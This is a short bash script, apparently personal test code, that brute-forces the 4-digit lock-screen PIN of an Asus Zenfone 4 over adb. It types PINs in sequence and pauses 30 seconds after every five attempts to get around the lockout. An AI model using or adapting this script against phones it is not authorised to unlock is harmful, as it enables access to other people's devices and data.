#Tested only on Asus Zenfone 4 A450CG via adb


#!/bin/bash
#{
lighton()
{
adb shell input keyevent KEYCODE_POWER
adb shell input touchscreen swipe 100 720 373 520   #Make a slide to make display glow or active
}
count=0
x=0

lighton
#adb shell input keyevent KEYCODE_POWER
#adb shell input touchscreen swipe 100 720 373 520

for i in {1200..1235}        #my password is 1234
do                           #for testing purpose loop starts from 1200 to 1235
echo $i                      #In ASUS zenfone 4 A450CG password length is only 4 digit.
adb shell input text $i
count=$((count+1))
if [ $count == 5 ]
then
adb shell input tap 256 562
sleep 30                        #Wait because on every 5 wrong password input, android login screen waits for 30 seconds
lighton
#sleep 5
count=0
continue
fi
done
#} ||
#{
#echo "Please,connect to same wifi-network or via usb debugging mode."
#}
